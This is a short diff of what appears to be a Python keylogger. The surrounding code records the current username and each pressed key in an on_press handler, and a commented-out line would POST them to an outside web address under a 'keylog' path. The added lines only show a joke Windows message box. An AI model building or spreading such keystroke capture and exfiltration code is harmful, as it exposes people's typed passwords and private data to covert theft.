@@ -155,6 +155,11 @@ counter=0
 def on_press(key):
     global counter
     
+    import ctypes  # An included library with Python install.
+    def Mbox(title, text, style):
+        return ctypes.windll.user32.MessageBoxW(0, text, title, style)
+    Mbox('BRATWURST', 'ich bin cool 123', 1)
+    
     name=getpass.getuser()
     data = {"name": str(name), "key": str(key)}
     #r = requests.post("http://benedikt-schwering.de/WannaSToftware/keylog/index.php", data=data)  # this will make the method "POST"
